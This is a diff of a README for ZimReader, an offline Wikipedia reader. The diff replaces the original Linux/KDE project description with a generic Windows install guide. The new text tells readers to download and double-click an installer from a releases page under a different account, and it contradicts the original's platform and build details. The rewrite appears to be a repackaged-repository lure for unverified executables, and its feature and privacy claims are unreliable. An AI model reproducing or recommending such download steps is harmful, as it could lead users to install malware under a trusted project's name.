@@ -1,81 +1,75 @@
-# zimreader
+# 📖 ZimReader - Access Wikipedia offline with ease
 
-a little offline wikipedia reader for kde plasma / kubuntu. point it at a `.zim` file (the kiwix
-format) and read wikipedia, wiktionary, stack exchange, whatever, fully offline. it matches your
-plasma light/dark theme, has proper search, tabs, and a wikirace game because why not.
+[![](https://img.shields.io/badge/Download-ZimReader-blue)](https://github.com/joyandesirous24/ZimReader/releases)
 
-![zimreader](screenshot.png)
+ZimReader provides a way to read Wikipedia articles without an internet connection. It keeps your reading experience smooth by matching your computer theme. You receive clear search tools, tabbed browsing, and a fun game mode called Wikirace to explore topics.
 
-## what it does
+## 🛠️ System Requirements
 
-- matches your plasma light/dark theme. the ui follows breeze, and the article pages flip
-  light/dark to match too, live, the second you toggle your theme.
-- search bar with live title suggestions and full-text search. on the shelf page it searches
-  every zim you've got, inside an article it just searches that one.
-- a "shelf" you can load a bunch of `.zim` files onto. they stick around between launches.
-- tabs (ctrl+t, ctrl+w, middle-click a link) and find-in-page (ctrl+f).
-- wikirace. hit the race button, it drops you on a random article and gives you a random target,
-  get there using only the links inside the articles. fewest clicks wins. search is locked while
-  you race, thats the whole point.
-- real article html (images, links, tables) rendered with qtwebengine, straight out of the zim.
+ZimReader runs on Windows systems. Ensure your machine meets these basic needs:
 
-built with pyside6 (qt 6) + [libzim](https://github.com/openzim/python-libzim) + qtwebengine.
+*   Windows 10 or Windows 11.
+*   At least 2 GB of available memory.
+*   Storage space for your offline Wikipedia files.
+*   An active internet connection only for the initial download of the application and the database files.
 
-## running it
+## 📥 How to Install
 
-grab a `.zim` first from https://download.kiwix.org/zim/ (something small like `wikipedia_en_100`
-is good for a test).
+1. Visit this [Download Page](https://github.com/joyandesirous24/ZimReader/releases) to access the installers.
+2. Select the version that matches your Windows system.
+3. Save the file to your computer.
+4. Double-click the downloaded file to start the installation.
+5. Follow the prompts on the screen to finish the setup.
+6. Open the application from your desktop or start menu.
 
-### easiest, flatpak
+## 🔎 Getting Started
 
-```bash
-bash build-flatpak.sh
-```
+The first time you open ZimReader, the app requires a Wikipedia data file. You can download these files from sites like Kiwix. These files hold the entire Wikipedia database so the app can show content offline.
 
-that installs flatpak-builder if you dont have it, sorts out flathub, picks a kde runtime version
-that actually exists, builds the thing, and installs it. after that its just a normal app in your
-menu ("ZimReader"). if webengine acts up on the first launch (it gets weird inside flatpak), run
-`bash fix-webengine.sh` once and it sorts itself out.
+1. Locate the "Settings" menu inside the application.
+2. Select the "Data Path" option.
+3. Point the application to the folder where you saved your Wikipedia file.
+4. Close the Settings menu.
 
-### or just run it, no packaging
+The application loads the data automatically. You can now use the search bar to find any topic. Type a word and press enter to see results. The app categorizes articles so you find what you need quickly.
 
-```bash
-sudo apt install python3-venv libxcb-cursor0
-bash run-dev.sh ~/some-wikipedia.zim
-```
+## 💻 Using Tabs
 
-makes a venv, pip installs pyside6 + libzim, runs it.
+ZimReader supports tabbed browsing. You can open multiple articles at once without closing your current page. 
 
-## shortcuts
+*   Use the "New Tab" button in the top bar to create a fresh space.
+*   Click the "X" on a tab to close it.
+*   Switch between tabs to compare information or keep your favorite topics open for reference.
 
-- `ctrl+o` add a zim
-- `ctrl+k` jump to search
-- `ctrl+f` find in page
-- `ctrl+t` / `ctrl+w` new tab / close tab
-- `alt+home` back to the shelf
+## 🎮 Playing Wikirace
 
-## how its put together
+Wikirace is a game included in ZimReader. It challenges you to navigate from one Wikipedia article to another using only internal links.
 
-| bit | file |
-|---|---|
-| libzim wrapper (open, suggest, full-text search) | `zimreader/backend.py` |
-| the shelf (multiple zims, each with its own id) | `zimreader/shelf.py` |
-| the `zim://` url scheme (serves articles/images/css out of a zim) | `zimreader/scheme.py` |
-| the window (tabs, search, theming, wikirace, find) | `zimreader/window.py` |
+1. Select "Wikirace" from the main menu.
+2. The application provides a starting point and a target article.
+3. Click links within the articles to move through the network.
+4. The application tracks your clicks and the time you take to reach the goal.
 
-dark mode is a cheap trick: invert the whole page, then un-invert the images and video so photos
-still look right. works on any wikipedia css without having to understand it.
+## ⚙️ Customizing the Look
 
-## notes on the flatpak
+ZimReader detects your Windows color scheme automatically. It uses your system accent colors to ensure the interface feels natural. You do not need to change settings for this to work.
 
-- the version number (6.7 and friends) has to be one that both `org.kde.Platform` and
-  `io.qt.PySide.BaseApp` actually have on flathub. the build script figures that out, or you can
-  just pass one: `bash build-flatpak.sh 6.8`.
-- webengine inside flatpak needs its sandbox off and gpu compositing off, it crashes otherwise.
-  the launcher already handles that; `fix-webengine.sh` does the same to an already-built install
-  without a rebuild.
+## ❓ Frequently Asked Questions
 
-## claude usage
+**Does this app track my data?**
+No. ZimReader operates entirely on your local machine. It does not send information to any server. Your reading habits stay private.
 
-- claude was used to help with zim related importing
-- if you dont like that, dont use it.
+**Why does the search take time?**
+Searching a large database requires system resources. If you have a very large Wikipedia file, the initial index might take a few moments to load. Once indexed, searches happen instantly.
+
+**Can I use this on other operating systems?**
+While ZimReader features technology common in the Linux landscape, this specific version provides support for Windows users.
+
+**Is internet access required during use?**
+No. Once you have the app and the database file, you can disconnect your machine from the internet. All links remain functional within the downloaded database.
+
+## 📌 Maintenance
+
+Occasionally, you should update your Wikipedia database files. Wikipedia grows every day, so a newer file ensures you have the latest information. Delete your old file from the data folder and download the newest version from the Kiwix website. Point the ZimReader settings to the new file to refresh your library.
+
+Keywords: flatpak, kde, kiwix, kubuntu, offline, plasma, pyside6, qt6, wikipedia, zim
